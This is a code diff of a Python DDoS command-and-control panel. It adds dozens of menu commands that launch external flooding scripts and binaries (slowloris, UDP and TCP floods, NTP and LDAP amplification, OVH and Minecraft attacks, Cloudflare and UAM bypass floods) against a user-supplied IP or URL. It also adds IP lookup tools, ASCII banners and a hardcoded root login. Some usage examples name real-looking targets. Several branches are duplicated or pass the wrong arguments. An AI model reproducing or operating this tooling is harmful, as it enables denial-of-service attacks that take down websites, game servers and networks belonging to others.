-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
+                print('Usage: flux <ip> <port> <threads>')
+                print('Example: flux 1.1.1.1 80 250')
+
+        elif "slowloris" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./slowloris {ip} {port}')
+            except IndexError:
+                print('Usage: slowloris <ip> <port>')
+                print('Example: slowloris 1.1.1.1 80')
+
+        elif "god" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl god.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: god <ip> <port> <time>')
+                print('Example: god 1.1.1.1 80 60')
+
+        elif "destroy" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
+            except IndexError:
+                print('Usage: destroy <ip> <port> <time>')
+                print('Example: destroy 1.1.1.1 80 60')
+
+        elif "std" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./STD-NOSPOOF {ip} {port}')
+            except IndexError:
+                print('Usage: std <ip> <port>')
+                print('Example: std 1.1.1.1 80')
+
+        elif "home" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                psize = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'perl home.pl {ip} {port} {psize} {time}')
+            except IndexError:
+                print('Usage: home <ip> <port> <packet_size> <time>')
+                print('Example: home 1.1.1.1 80 65500 60')
+
+        elif "UDP" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                packet = cnc.split()[3]
+                thread = cnc.split()[4]
+                time = cnc.split()[5]
+                os.system(f'python UDP.py {ip} {port} {packet} {thread} {time}')
+            except IndexError:
+                print('Usage: UDP <ip> <port> <packet> <thread> <time>')
+                print('Example: UDP 1.1.1.1 80 5000000 500 200')
+
+        elif "nfo-killer" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
+            except IndexError:
+                print('Usage: nfo-killer <ip> <port> <threads> <time>')
+                print('Example: nfo-killer 1.1.1.1 80 850 60')
+
+        elif "ovh-raw" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
+            except IndexError:
+                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')
+
+        elif "tcp" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4]
+                conns = cnc.split()[5]
+                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
+            except IndexError:
+                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
+                print('Example: tcp GET 1.1.1.1 80 60 8500')
+
+# SPECIAL METHODS
+
+        elif "stress" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                mode = cnc.split()[3]
+                conn = cnc.split()[4]
+                time = cnc.split()[5]
+                out = cnc.split()[6]
+                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
+            except IndexError:
+                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
+                print('MODE: [1] TCP')
+                print('      [2] UDP')
+                print('      [3] HTTP')
+                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                 
+# AMP/GAMES METHODS
 
-		
-					
+        elif "samp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'python2 samp.py {ip} {port}')
+            except IndexError:
+                print('Usage: samp <ip> <port>')
+                print('Example: samp 1.1.1.1 7777')
+
+        elif "ldap" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
+            except IndexError:
+                print('Usage: ldap <ip> <port> <threads> <time>')
+                print('Example: ldap 1.1.1.1 80 650 60')
+
+        elif "minecraft" in cnc:
+            try:
+                ip = cnc.split()[1]
+                throttle = cnc.split()[2]
+                threads = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
+            except IndexError:
+                print('Usage: minecraft <ip> <throttle> <threads> <time>')
+                print('Example: minecraft 1.1.1.1 5000 500 60')
+
+        elif "ovh-amp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./OVH-AMP {ip} {port}')
+            except IndexError:
+                print('Usage: ovh-amp <ip> <port>')
+                print('Example: ovh-amp 1.1.1.1 80')
+                
+        elif "ntp" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                throttle = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
+            except IndexError:
+                print('Usage: ntp <ip> <port> <throttle> <time>')
+                print('Example: ntp 1.1.1.1 22 250 60')
+
+# LAYER 7 METHODS
  
+        elif "ovh-beam" in cnc:
+            try:
+                method = cnc.split()[1]
+                ip = cnc.split()[2]
+                port = cnc.split()[3]
+                time = cnc.split()[4] 
+                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
+            except IndexError:
+                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
+                print('Example: ovh-beam GET 51.38.92.223 80 60')
+    
+        elif "https-spoof" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'python3 https-spoof.py {url} {time} {thread}')
+            except IndexError:
+                print('Usage: https-spoof <url> <time> <threads>')
+                print('Example: https-spoof http://vailon.com 60 500')
+    
+        elif "slow" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node slow.js {url} {time}')
+            except IndexError:
+                print('Usage: slow <url> <time>')
+                print('Example: slow http://vailon.com 60')
+    
+        elif "hyper" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node hyper.js {url} {time}')
+            except IndexError:
+                print('Usage: hyper <url> <time>')
+                print('Example: hyper http://vailon.com 60')
+                
+        elif "cf-socket" in cnc:
+            try:
+                os.system(f'python3 bypass.py')
+            except IndexError:
+                print('cf-socket')
+    
+        elif "cf-pro" in cnc:
+            try:
+                os.system(f'python3 cf-pro.py')
+            except IndexError:
+                print('cf-pro')
+        elif "cf-socket" in cnc:
+            try:
+                os.system(f'python3 bypass.py')
+            except IndexError:
+                print('cf-socket')
+        
+        elif "http-socket" in cnc:
+            try:
+                url = cnc.split()[1]
+                per = cnc.split()[2]
+                time = cnc.split()[3]
+                os.system(f'node HTTP-SOCKET {url} {per} {time}')
+            except IndexError:
+                print('Usage: http-socket <url> <per> <time>')
+                print('Example: http-socket http://example.com 5000 60')
+
+        elif "HTTP-RAW" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node HTTP-RAW.js {url} proxies.txt {time} POST')
+            except IndexError:
+                print('Usage: HTTP-RAW <url> <time>')
+                print('Example: HTTP-RAW http://example.com 60')
+
+        elif "http-get" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node http-get {url} {time}')
+            except IndexError:
+                print('Usage: http-get <url> <time>')
+                print('Example: http-get http://example.com 60')
+
+        elif "http-premium" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node http-get {url} {time}')
+            except IndexError:
+                print('Usage: http-premium <url> <time>')
+                print('Example: http-get http://example.com 60')
+
+
+
+
+        elif "http-requests" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node HTTP-REQUESTS {url} {time}')
+            except IndexError:
+                print('Usage: http-requests <url> <time>')
+                print('Example: http-requests http://example.org 60')
+
+        elif "http-rand" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                os.system(f'node HTTP-RAND.js {url} {time}')
+            except IndexError:
+                print('Usage: http-rand <url> <time>')
+                print('Example: http-rand http://vailon.com/ 60')
+
+        elif "overflow" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'./OVERFLOW {ip} {port} {thread}')
+            except IndexError:
+                print('Usage: overflow <ip> <port> <threads>')
+                print('Example: overflow 1.1.1.1 80 5000')
+
+        elif "cf-bypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'node cf.js {url} {time} {thread}')
+            except IndexError:
+                print('Usage: cf-bypass <url> <time> <threads>')
+                print('Example: cf-bypass http://example.com 60 1250')
+
+        elif "uambypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                per = cnc.split()[3]
+                os.system(f'node uambypass.js {url} {time} {per} http.txt')
+            except IndexError:
+                print('Usage: uambypass <url> <time> <req_per_ip>')
+                print('Example: uambypass http://example.com 60 1250')
+
+        elif "crash" in cnc:
+            try:
+                url = cnc.split()[1]
+                method = cnc.split()[2]
+                os.system(f'go run Hulk.go -site {url} -data {method}')
+            except IndexError:
+                print('Usage: crash <url> METHODS<GET/POST>')
+                print('Example: crash http://example.com GET')
+
+        elif "httpflood" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
+            except IndexError:
+                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: httpflood http://example.com 15000 get 60')
+
+        elif "httpget" in cnc:
+            try:
+                url = cnc.split()[1]
+                os.system(f'node http-get {url} {time}')
+            except IndexError:
+                print('Usage: http-get <url> <time>')
+                print('Example: htt-get http://example.com')
+
+        elif "Tlsv1" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                rps = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxy = cnc.split()[5]
+                
+                os.system(f'node Tlsv1 {url} {time} {time}')
+            except IndexError:
+                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
+                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+
+        elif "BYPASS" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]
+                rps = cnc.split()[3]
+                threads = cnc.split()[4]
+                proxy = cnc.split()[5]
+                
+                os.system(f'node Tlsv1 {url} {time} {time}')
+            except IndexError:
+                print('Usage: http-socket <url> <time> <rps> <threads> <proxies.txt>')
+                print('Example: http-socket http://example.com 60 5000 500 proxies.txt')
+
+        
+
+# BANNERS
+
+        elif "troll" in cnc:
+                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
+                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
+                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
+                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
+                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
+                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
+                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
+                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
+                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
+                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
+                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
+                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
+                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
+                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
+                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')
+
+        elif "pikachu" in cnc:
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
+                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
+                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
+                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
+                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
+                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')
+
+                
+# TOOLS
+        elif "geoip" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: geoip <ip>')
+                print('Example: geoip 1.1.1.1')
+
+        elif "reverseip" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: reverseip <ip>')
+                print('Example: reverseip 1.1.1.1')
+
+        elif "subnet-lookup" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: subnet-lookup <cdr/ip + netmask>')
+                print('Example: subnet-lookup 192.168.1.0/24')
+
+        elif "asn-lookup" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: asn-lookup <ip/asn>')
+                print('Example: asn-lookup AS15169')
+
+        elif "dns-lookup" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: dns-lookup <dns>')
+                print('Example: dns-lookup google.com')
+
+        elif "reverse-dns" in cnc:
+            try:
+                ip = cnc.split()[1]
+                try:
+                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
+                    print(r.text)
+                except:
+                    print("[ API Error :( ]")
+            except IndexError:
+                print('Usage: reverse-dns <ip/domain>')
+                print('Example: reverse-dns 8.8.8.8')                
+
+        elif "cloudflare-lag" in cnc:
+            print('Method "CLOUDFLARE-LAG" not enabled')
+
+        elif "help" in cnc:
+            print(f'''
+LAYER7  ► SHOW LAYER7 METHODS
+LAYER4  ► SHOW LAYER4 METHODS
+AMP     ► SHOW AMP METHODS
+SPECIAL ► SHOW SPECIAL METHODS
+BANNERS ► SHOW BANNERS
+RULES   ► RULES PANEL
+PORTS   ► SHOW ALL PORTS
+TOOLS   ► SHOW TOOLS
+CLEAR   ► CLEAR TERMINAL
+            ''')
+
+        else:
+            try:
+                cmmnd = cnc.split()[0]
+                print("Command: [ " + cmmnd + " ] Not Found!")
+            except IndexError:
+                pass
+
+
 def login():
     os.system("clear")
-    user = "admin"
-    passwd = "admin"
+    user = "root"
+    passwd = "23"
     username = input("""
 
 
